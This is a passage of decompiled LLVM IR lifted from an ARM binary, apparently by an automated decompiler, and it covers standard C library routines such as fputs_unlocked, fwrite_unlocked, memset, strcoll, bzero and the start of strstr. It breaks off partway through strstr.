dec_label_pc_1407c:                               ; preds = %dec_label_pc_14070, %dec_label_pc_14074.backedge, %dec_label_pc_14030, %dec_label_pc_14074.preheader, %dec_label_pc_14058
  %v0_1407c = load i32, i32* @r5, align 4
  %v1_1407c = load i32, i32* @r7, align 4
  %v3_1407c = icmp uge i32 %v0_1407c, %v1_1407c
  store i1 %v3_1407c, i1* %cpsr_c.global-to-local, align 1
  %v9_1407c = icmp eq i32 %v0_1407c, %v1_1407c
  store i1 %v9_1407c, i1* %cpsr_z.global-to-local, align 1
  %v2_14080 = xor i1 %v9_1407c, true
  %v3_14080 = and i1 %v3_1407c, %v2_14080
  br i1 %v3_14080, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1407c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_14084 = inttoptr i32 %v0_1407c to i8*
  store i8 0, i8* %v7_14084, align 1
  %v0_14088.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_14088.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1407c, %bb
  %v1_14088 = phi i1 [ %v1_14088.pre, %bb ], [ %v9_1407c, %dec_label_pc_1407c ]
  %v0_14088 = phi i1 [ %v0_14088.pre, %bb ], [ %v3_1407c, %dec_label_pc_1407c ]
  %v2_14088 = xor i1 %v1_14088, true
  %v3_14088 = and i1 %v0_14088, %v2_14088
  br i1 %v3_14088, label %.dec_label_pc_14090_crit_edge, label %dec_label_pc_1408c

.dec_label_pc_14090_crit_edge:                    ; preds = %.thread14
  %v0_14090.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_14090

dec_label_pc_1408c:                               ; preds = %entry, %dec_label_pc_14058, %.thread14
  br label %dec_label_pc_14090

dec_label_pc_14090:                               ; preds = %.dec_label_pc_14090_crit_edge, %dec_label_pc_1408c
  %v0_14090 = phi i32 [ %v0_14090.pre, %.dec_label_pc_14090_crit_edge ], [ 0, %dec_label_pc_1408c ]
  store i32 %v6_14000, i32* @r5, align 4
  ret i32 %v0_14090

; uselistorder directives
  uselistorder i1 %v9_1407c, { 1, 0, 2 }
  uselistorder i32 %v1_1407c, { 1, 0 }
  uselistorder i32 %v0_1407c, { 0, 2, 1 }
  uselistorder i32 %v0_14074, { 2, 0, 1 }
  uselistorder i32 %v0_1406c, { 1, 0 }
  uselistorder i32 %v3_14048, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14038, { 1, 0 }
  uselistorder i32 %v3_14020, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14044, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_14090, { 1, 0 }
  uselistorder label %dec_label_pc_1408c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1407c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_14020, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_140a0 = load i32, i32* @r4, align 4
  store i32 %v3_140a0, i32* %stack_var_-16, align 4
  %v6_140a0 = load i32, i32* @r5, align 4
  %v9_140a0 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_140ac = call i32 @strlen(i8* %arg1)
  store i32 %v3_140ac, i32* @r6, align 4
  %v0_140b4 = load i32, i32* @r5, align 4
  %v0_140b8 = load i32, i32* @r4, align 4
  %v5_140c4 = inttoptr i32 %v0_140b4 to i16*
  %v6_140c4 = call i32 @__GI_fwrite_unlocked(i32 %v0_140b8, i32 1, i32 %v3_140ac, i16* %v5_140c4)
  %v1_140c8 = load i32, i32* @r6, align 4
  %v9_140c8 = icmp eq i32 %v6_140c4, %v1_140c8
  br i1 %v9_140c8, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_140d4 = phi i32 [ %v6_140c4, %entry ], [ -1, %bb ]
  %v2_140d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_140d0, i32* @r4, align 4
  store i32 %v6_140a0, i32* @r5, align 4
  store i32 %v9_140a0, i32* @r6, align 4
  ret i32 %v1_140d4

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_140d8 = load i32, i32* @r6, align 4
  %v12_140d8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_140e0 = load i16, i16* %arg4, align 2
  %v1_140e4 = and i16 %v3_140e0, 192
  %v2_140e8 = icmp eq i16 %v1_140e4, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_140e8, label %dec_label_pc_14114, label %dec_label_pc_14100

dec_label_pc_14100:                               ; preds = %entry
  %v4_14108 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_1410c = icmp eq i32 %v4_14108, 0
  br i1 %v2_1410c, label %dec_label_pc_14114thread-pre-split, label %dec_label_pc_14174

dec_label_pc_14114thread-pre-split:               ; preds = %dec_label_pc_14100
  %v0_14114.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_14114thread-pre-split, %entry
  %v0_14138 = phi i32 [ %v0_14114.pr, %dec_label_pc_14114thread-pre-split ], [ %arg2, %entry ]
  %v2_14114 = icmp eq i32 %v0_14138, 0
  br i1 %v2_14114, label %dec_label_pc_14174, label %bb

bb:                                               ; preds = %dec_label_pc_14114
  %v1_14118 = load i32, i32* @r6, align 4
  %v3_14118 = icmp eq i32 %v1_14118, 0
  br i1 %v3_14118, label %dec_label_pc_14174, label %dec_label_pc_14120

dec_label_pc_14120:                               ; preds = %bb
  %v2_14128 = udiv i32 -1, %v0_14138
  %tmp9 = icmp ugt i32 %v1_14118, %v2_14128
  %v0_14154 = load i32, i32* @r5, align 4
  %v1_14154 = inttoptr i32 %v0_14154 to i16*
  br i1 %tmp9, label %dec_label_pc_14154, label %dec_label_pc_14134

dec_label_pc_14134:                               ; preds = %dec_label_pc_14120
  store i32 %v0_14154, i32* %r2.global-to-local, align 4
  %v2_14138 = mul i32 %v1_14118, %v0_14138
  %v0_1413c = load i32, i32* @r7, align 4
  %v5_14140 = call i32 @__stdio_fwrite(i32 %v0_1413c, i32 %v2_14138, i16* %v1_14154)
  %v0_14144 = load i32, i32* @r4, align 4
  %v2_14148 = udiv i32 %v5_14140, %v0_14144
  store i32 %v2_14148, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14154:                               ; preds = %dec_label_pc_14120
  %v2_14154 = load i16, i16* %v1_14154, align 2
  %v1_14158 = or i16 %v2_14154, 8
  store i16 %v1_14158, i16* %v1_14154, align 2
  %v0_14160 = call i32 @__GI___errno_location()
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1416c = inttoptr i32 %v0_14160 to i32*
  store i32 22, i32* %v2_1416c, align 4
  %v0_14178.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14174:                               ; preds = %dec_label_pc_14114, %dec_label_pc_14100, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_14154, %dec_label_pc_14134, %dec_label_pc_14174
  %v0_14178 = phi i32 [ %v0_14178.pre, %dec_label_pc_14154 ], [ %v2_14148, %dec_label_pc_14134 ], [ 0, %dec_label_pc_14174 ]
  store i32 %v9_140d8, i32* @r6, align 4
  store i32 %v12_140d8, i32* @r7, align 4
  ret i32 %v0_14178

; uselistorder directives
  uselistorder i16* %v1_14154, { 0, 2, 1 }
  uselistorder i32 %v1_14118, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i16*, i32)* @__stdio_trans2w_o, { 1, 0 }
  uselistorder label %dec_label_pc_14178, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14174, { 2, 0, 1 }
}

define i32 @function_14188(i32 %arg1) local_unnamed_addr {
dec_label_pc_14188:
  ret i32 %arg1
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_14194 = load i32, i32* @r2, align 4
  %v8_14194 = icmp eq i32 %v0_14194, 8
  store i1 %v8_14194, i1* %cpsr_z.global-to-local, align 1
  %v5_14198 = icmp slt i32 %v0_14194, 8
  br i1 %v5_14198, label %dec_label_pc_141f8, label %dec_label_pc_1419c

dec_label_pc_1419c:                               ; preds = %entry
  %v4_1419c = mul i32 %arg2, 256
  %v5_1419c = or i32 %v4_1419c, %arg2
  %v4_141a0 = mul i32 %v5_1419c, 65536
  %v5_141a0 = or i32 %v4_141a0, %v5_1419c
  store i32 %v5_141a0, i32* %r1.global-to-local, align 4
  %v1_141a457 = urem i32 %tmp, 4
  %v2_141a458 = icmp eq i32 %v1_141a457, 0
  store i1 %v2_141a458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_141a458, label %dec_label_pc_141b4, label %bb

bb:                                               ; preds = %dec_label_pc_1419c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1419c ]
  %v3_141a859 = phi i32 [ %v6_141a8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1419c ]
  %v4_141a8 = inttoptr i32 %v3_141a859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_141a8, align 1
  %v5_141a8 = load i32, i32* @r3, align 4
  %v6_141a8 = add i32 %v5_141a8, 1
  store i32 %v6_141a8, i32* @r3, align 4
  %v0_141ac.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_141b8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_141ac.pr, label %dec_label_pc_141b4, label %.thread

.thread:                                          ; preds = %bb
  %v2_141ac = add i32 %v0_141b8.pr.pre, -1
  store i32 %v2_141ac, i32* @r2, align 4
  %v1_141a4 = urem i32 %v6_141a8, 4
  %v2_141a4 = icmp eq i32 %v1_141a4, 0
  store i1 %v2_141a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141a4, label %dec_label_pc_141b4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_141a8.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_141a8.pre to i8
  br label %bb

dec_label_pc_141b4:                               ; preds = %.thread, %bb, %dec_label_pc_1419c
  %v0_141c028 = phi i32 [ %tmp, %dec_label_pc_1419c ], [ %v6_141a8, %bb ], [ %v6_141a8, %.thread ]
  %v0_141b8.pr = phi i32 [ %v0_14194, %dec_label_pc_1419c ], [ %v0_141b8.pr.pre, %bb ], [ %v2_141ac, %.thread ]
  %v0_141b4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_141b4, i32* @ip, align 4
  %v8_141b810 = icmp eq i32 %v0_141b8.pr, 8
  store i1 %v8_141b810, i1* %cpsr_z.global-to-local, align 1
  %v5_141bc11 = icmp slt i32 %v0_141b8.pr, 8
  br i1 %v5_141bc11, label %dec_label_pc_141f8, label %dec_label_pc_141c0.preheader

dec_label_pc_141c0.preheader:                     ; preds = %dec_label_pc_141b4
  %v1_141c046 = inttoptr i32 %v0_141c028 to i32*
  store i32 %v0_141b4, i32* %v1_141c046, align 4
  %v3_141c047 = add i32 %v0_141c028, 4
  %v4_141c048 = inttoptr i32 %v3_141c047 to i32*
  %v5_141c049 = load i32, i32* @ip, align 4
  store i32 %v5_141c049, i32* %v4_141c048, align 4
  %v6_141c050 = add i32 %v0_141c028, 8
  store i32 %v6_141c050, i32* @r3, align 4
  %v0_141c451 = load i32, i32* @r2, align 4
  %v1_141c452 = add i32 %v0_141c451, -8
  store i32 %v1_141c452, i32* %r2.global-to-local, align 4
  %v5_141cc53 = icmp slt i32 %v1_141c452, 8
  br i1 %v5_141cc53, label %dec_label_pc_141c0.dec_label_pc_141f8.loopexit_crit_edge, label %dec_label_pc_141d0

dec_label_pc_141d0:                               ; preds = %dec_label_pc_141c0.preheader, %dec_label_pc_141b8.dec_label_pc_141c0_crit_edge
  %v6_141c055 = phi i32 [ %v6_141c0, %dec_label_pc_141b8.dec_label_pc_141c0_crit_edge ], [ %v6_141c050, %dec_label_pc_141c0.preheader ]
  %v0_141c054 = phi i32 [ %v12_141ec, %dec_label_pc_141b8.dec_label_pc_141c0_crit_edge ], [ %v0_141c028, %dec_label_pc_141c0.preheader ]
  %v1_141d0 = inttoptr i32 %v6_141c055 to i32*
  %v2_141d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_141d0, i32* %v1_141d0, align 4
  %v3_141d0 = add i32 %v0_141c054, 12
  %v4_141d0 = inttoptr i32 %v3_141d0 to i32*
  %v5_141d0 = load i32, i32* @ip, align 4
  store i32 %v5_141d0, i32* %v4_141d0, align 4
  %v6_141d0 = add i32 %v0_141c054, 16
  store i32 %v6_141d0, i32* @r3, align 4
  %v0_141d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_141d4 = add i32 %v0_141d4, -8
  store i32 %v1_141d4, i32* %r2.global-to-local, align 4
  %v5_141dc = icmp slt i32 %v1_141d4, 8
  br i1 %v5_141dc, label %dec_label_pc_141d0.dec_label_pc_141f8.loopexit_crit_edge, label %dec_label_pc_141e0

dec_label_pc_141e0:                               ; preds = %dec_label_pc_141d0
  %v1_141e0 = inttoptr i32 %v6_141d0 to i32*
  %v2_141e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_141e0, i32* %v1_141e0, align 4
  %v3_141e0 = add i32 %v0_141c054, 20
  %v4_141e0 = inttoptr i32 %v3_141e0 to i32*
  %v5_141e0 = load i32, i32* @ip, align 4
  store i32 %v5_141e0, i32* %v4_141e0, align 4
  %v6_141e0 = add i32 %v0_141c054, 24
  store i32 %v6_141e0, i32* @r3, align 4
  %v0_141e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_141e4 = add i32 %v0_141e4, -8
  store i32 %v1_141e4, i32* %r2.global-to-local, align 4
  %v5_141ec = icmp slt i32 %v1_141e4, 8
  br i1 %v5_141ec, label %dec_label_pc_141e0.dec_label_pc_141f8.loopexit_crit_edge, label %dec_label_pc_141b8

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141e0
  %v7_141ec = inttoptr i32 %v6_141e0 to i32*
  %v8_141ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_141ec, i32* %v7_141ec, align 4
  %v9_141ec = add i32 %v0_141c054, 28
  %v10_141ec = inttoptr i32 %v9_141ec to i32*
  %v11_141ec = load i32, i32* @ip, align 4
  store i32 %v11_141ec, i32* %v10_141ec, align 4
  %v12_141ec = add i32 %v0_141c054, 32
  store i32 %v12_141ec, i32* @r3, align 4
  %v6_141f0 = load i32, i32* %r2.global-to-local, align 4
  %v7_141f0 = add i32 %v6_141f0, -8
  store i32 %v7_141f0, i32* %r2.global-to-local, align 4
  %v5_141bc = icmp slt i32 %v7_141f0, 8
  br i1 %v5_141bc, label %dec_label_pc_141b8.dec_label_pc_141f8.loopexit_crit_edge, label %dec_label_pc_141b8.dec_label_pc_141c0_crit_edge

dec_label_pc_141b8.dec_label_pc_141c0_crit_edge:  ; preds = %dec_label_pc_141b8
  %v2_141c0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_141c0 = inttoptr i32 %v12_141ec to i32*
  store i32 %v2_141c0.pre, i32* %v1_141c0, align 4
  %v3_141c0 = add i32 %v0_141c054, 36
  %v4_141c0 = inttoptr i32 %v3_141c0 to i32*
  %v5_141c0 = load i32, i32* @ip, align 4
  store i32 %v5_141c0, i32* %v4_141c0, align 4
  %v6_141c0 = add i32 %v0_141c054, 40
  store i32 %v6_141c0, i32* @r3, align 4
  %v0_141c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_141c4 = add i32 %v0_141c4, -8
  store i32 %v1_141c4, i32* %r2.global-to-local, align 4
  %v5_141cc = icmp slt i32 %v1_141c4, 8
  br i1 %v5_141cc, label %dec_label_pc_141c0.dec_label_pc_141f8.loopexit_crit_edge, label %dec_label_pc_141d0

dec_label_pc_141b8.dec_label_pc_141f8.loopexit_crit_edge: ; preds = %dec_label_pc_141b8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_141f8

dec_label_pc_141c0.dec_label_pc_141f8.loopexit_crit_edge: ; preds = %dec_label_pc_141b8.dec_label_pc_141c0_crit_edge, %dec_label_pc_141c0.preheader
  %v1_141c4.lcssa = phi i32 [ %v1_141c452, %dec_label_pc_141c0.preheader ], [ %v1_141c4, %dec_label_pc_141b8.dec_label_pc_141c0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_141f8

dec_label_pc_141d0.dec_label_pc_141f8.loopexit_crit_edge: ; preds = %dec_label_pc_141d0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_141f8

dec_label_pc_141e0.dec_label_pc_141f8.loopexit_crit_edge: ; preds = %dec_label_pc_141e0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %dec_label_pc_141b4, %dec_label_pc_141b8.dec_label_pc_141f8.loopexit_crit_edge, %dec_label_pc_141c0.dec_label_pc_141f8.loopexit_crit_edge, %dec_label_pc_141d0.dec_label_pc_141f8.loopexit_crit_edge, %dec_label_pc_141e0.dec_label_pc_141f8.loopexit_crit_edge, %entry
  %v0_14200 = phi i32 [ %v0_14194, %entry ], [ %v1_141e4, %dec_label_pc_141e0.dec_label_pc_141f8.loopexit_crit_edge ], [ %v1_141d4, %dec_label_pc_141d0.dec_label_pc_141f8.loopexit_crit_edge ], [ %v1_141c4.lcssa, %dec_label_pc_141c0.dec_label_pc_141f8.loopexit_crit_edge ], [ %v7_141f0, %dec_label_pc_141b8.dec_label_pc_141f8.loopexit_crit_edge ], [ %v0_141b8.pr, %dec_label_pc_141b4 ]
  %v2_141f8 = icmp eq i32 %v0_14200, 0
  store i1 %v2_141f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141f8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_141f8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_141f8
  %v1_14200 = sub i32 7, %v0_14200
  store i32 %v1_14200, i32* %r2.global-to-local, align 4
  %v3_14204 = mul i32 %v1_14200, 4
  %v4_14204 = add i32 %v3_14204, ptrtoint (i32* @global_var_1420c.1092 to i32)
  call void @__pseudo_branch(i32 %v4_14204)
  %v0_1420c = load i32, i32* %r1.global-to-local, align 4
  %v1_1420c = trunc i32 %v0_1420c to i8
  %v2_1420c = load i32, i32* @r3, align 4
  %v3_1420c = inttoptr i32 %v2_1420c to i8*
  store i8 %v1_1420c, i8* %v3_1420c, align 1
  %v4_1420c = load i32, i32* @r3, align 4
  %v5_1420c = add i32 %v4_1420c, 1
  store i32 %v5_1420c, i32* %r3.global-to-local, align 4
  %v0_14210 = load i32, i32* %r1.global-to-local, align 4
  %v1_14210 = trunc i32 %v0_14210 to i8
  %v3_14210 = inttoptr i32 %v5_1420c to i8*
  store i8 %v1_14210, i8* %v3_14210, align 1
  %v4_14210 = load i32, i32* %r3.global-to-local, align 4
  %v5_14210 = add i32 %v4_14210, 1
  store i32 %v5_14210, i32* %r3.global-to-local, align 4
  %v0_14214 = load i32, i32* %r1.global-to-local, align 4
  %v1_14214 = trunc i32 %v0_14214 to i8
  %v3_14214 = inttoptr i32 %v5_14210 to i8*
  store i8 %v1_14214, i8* %v3_14214, align 1
  %v4_14214 = load i32, i32* %r3.global-to-local, align 4
  %v5_14214 = add i32 %v4_14214, 1
  store i32 %v5_14214, i32* %r3.global-to-local, align 4
  %v0_14218 = load i32, i32* %r1.global-to-local, align 4
  %v1_14218 = trunc i32 %v0_14218 to i8
  %v3_14218 = inttoptr i32 %v5_14214 to i8*
  store i8 %v1_14218, i8* %v3_14218, align 1
  %v4_14218 = load i32, i32* %r3.global-to-local, align 4
  %v5_14218 = add i32 %v4_14218, 1
  store i32 %v5_14218, i32* %r3.global-to-local, align 4
  %v0_1421c = load i32, i32* %r1.global-to-local, align 4
  %v1_1421c = trunc i32 %v0_1421c to i8
  %v3_1421c = inttoptr i32 %v5_14218 to i8*
  store i8 %v1_1421c, i8* %v3_1421c, align 1
  %v4_1421c = load i32, i32* %r3.global-to-local, align 4
  %v5_1421c = add i32 %v4_1421c, 1
  store i32 %v5_1421c, i32* %r3.global-to-local, align 4
  %v0_14220 = load i32, i32* %r1.global-to-local, align 4
  %v1_14220 = trunc i32 %v0_14220 to i8
  %v3_14220 = inttoptr i32 %v5_1421c to i8*
  store i8 %v1_14220, i8* %v3_14220, align 1
  %v4_14220 = load i32, i32* %r3.global-to-local, align 4
  %v5_14220 = add i32 %v4_14220, 1
  store i32 %v5_14220, i32* %r3.global-to-local, align 4
  %v0_14224 = load i32, i32* %r1.global-to-local, align 4
  %v1_14224 = trunc i32 %v0_14224 to i8
  %v3_14224 = inttoptr i32 %v5_14220 to i8*
  store i8 %v1_14224, i8* %v3_14224, align 1
  %v4_14224 = load i32, i32* %r3.global-to-local, align 4
  %v5_14224 = add i32 %v4_14224, 1
  store i32 %v5_14224, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_141c0, { 1, 0 }
  uselistorder i32 %v12_141ec, { 1, 2, 0 }
  uselistorder i32 %v0_141c054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_141b8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_141a8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1419c, { 1, 0 }
  uselistorder i32 %v0_14194, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_141f8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_141d0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_1429c = inttoptr i32 %arg2 to i8*
  %v3_1429c = call i32 @_memcpy(i8* %v2_1429c, i32 %arg1)
  ret i32 %v3_1429c
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_142a4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_142a4 = phi i32 [ %v0_142a4.pre, %bb ], [ %v5_142a4, %bb3 ]
  %v0_142a0 = phi i32 [ %tmp, %bb ], [ %v5_142a0, %bb3 ]
  %v1_142a0 = inttoptr i32 %v0_142a0 to i8*
  %v2_142a0 = load i8, i8* %v1_142a0, align 1
  %v3_142a0 = zext i8 %v2_142a0 to i32
  store i32 %v3_142a0, i32* @r2, align 4
  %v1_142a4 = inttoptr i32 %v0_142a4 to i8*
  %v2_142a4 = load i8, i8* %v1_142a4, align 1
  %v3_142a4 = zext i8 %v2_142a4 to i32
  %v2_142a8 = icmp eq i8 %v2_142a0, 0
  br i1 %v2_142a8, label %.dec_label_pc_142b4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_142a4 = add i32 %v0_142a4, 1
  %v5_142a0 = add i32 %v0_142a0, 1
  %v10_142ac = icmp eq i8 %v2_142a0, %v2_142a4
  br i1 %v10_142ac, label %entry, label %dec_label_pc_142b4

.dec_label_pc_142b4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_142b4

dec_label_pc_142b4:                               ; preds = %bb3, %.dec_label_pc_142b4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_142b4_crit_edge ], [ %v3_142a0, %bb3 ]
  %v2_142b4.pre-phi = sub nsw i32 %.pn, %v3_142a4
  ret i32 %v2_142b4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_142a0, { 1, 0 }
  uselistorder i32 %v0_142a4, { 1, 0 }
  uselistorder label %dec_label_pc_142b4, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_142c0 = load i32, i32* @r0, align 4
  %v1_142c0 = load i32, i32* @r1, align 4
  %v2_142c0 = inttoptr i32 %v0_142c0 to i8*
  %v3_142c0 = call i32 @_memcpy(i8* %v2_142c0, i32 %v1_142c0)
  ret i32 %v3_142c0
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_142d8 = load i32, i32* @r0, align 4
  %v2_142d8 = inttoptr i32 %v0_142d8 to i8*
  %v3_142d8 = call i32 @__GI_memset(i8* %v2_142d8, i32 0)
  ret i32 %v3_142d8
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_142e4 = load i8, i8* %arg2, align 1
  %v2_142e8 = icmp eq i8 %v3_142e4, 0
  %v1_143d8.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_142e8, label %dec_label_pc_143d4, label %dec_label_pc_142f0

dec_label_pc_142f0:                               ; preds = %entry
  %v1_142f0 = add i32 %v1_143d8.pre, -1
  store i32 %v1_142f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_142f4

dec_label_pc_142f4:                               ; preds = %dec_label_pc_14300, %dec_label_pc_142f0
  %v0_142f4 = phi i32 [ %v1_142f4, %dec_label_pc_14300 ], [ %v1_142f0, %dec_label_pc_142f0 ]
  %v1_142f4 = add i32 %v0_142f4, 1
  %v2_142f4 = inttoptr i32 %v1_142f4 to i8*
  %v3_142f4 = load i8, i8* %v2_142f4, align 1
  store i32 %v1_142f4, i32* %r0.global-to-local, align 4
  %v2_142f8 = icmp eq i8 %v3_142f4, 0
  br i1 %v2_142f8, label %dec_label_pc_143d0, label %dec_label_pc_14300

dec_label_pc_14300:                               ; preds = %dec_label_pc_142f4
  %v9_14300 = icmp eq i8 %v3_142f4, %v3_142e4
  br i1 %v9_14300, label %dec_label_pc_14308, label %dec_label_pc_142f4

dec_label_pc_14308:                               ; preds = %dec_label_pc_14300
  %v2_14308 = add i32 %tmp, 1
  %v3_14308 = inttoptr i32 %v2_14308 to i8*
  %v4_14308 = load i8, i8* %v3_14308, align 1
  %v2_1430c = icmp eq i8 %v4_14308, 0
  br i1 %v2_1430c, label %dec_label_pc_143d4, label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %dec_label_pc_14308
  %v1_14318 = add i32 %v0_142f4, 2
  %v1_1436c = add i32 %tmp, 2
  %v2_1436c = inttoptr i32 %v1_1436c to i8*
  br label %dec_label_pc_14364

dec_label_pc_14328:                               ; preds = %dec_label_pc_143c4
  %v3_14328 = load i8, i8* %v3_1435c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14354.preheader

dec_label_pc_14354.preheader:                     ; preds = %dec_label_pc_14328, %dec_label_pc_14364
  %v0_143543.in = phi i8 [ %v3_14328, %dec_label_pc_14328 ], [ %v3_1435c.pn, %dec_label_pc_14364 ]
  %v9_1435412 = icmp eq i8 %v0_143543.in, %v3_142e4
  br i1 %v9_1435412, label %dec_label_pc_1435c, label %dec_label_pc_14334

dec_label_pc_14334:                               ; preds = %dec_label_pc_14354.preheader, %dec_label_pc_14350
  %v0_1433c = phi i32 [ %v1_14350, %dec_label_pc_14350 ], [ %storemerge41, %dec_label_pc_14354.preheader ]
  %v0_14334.in = phi i8 [ %v3_14350, %dec_label_pc_14350 ], [ %v0_143543.in, %dec_label_pc_14354.preheader ]
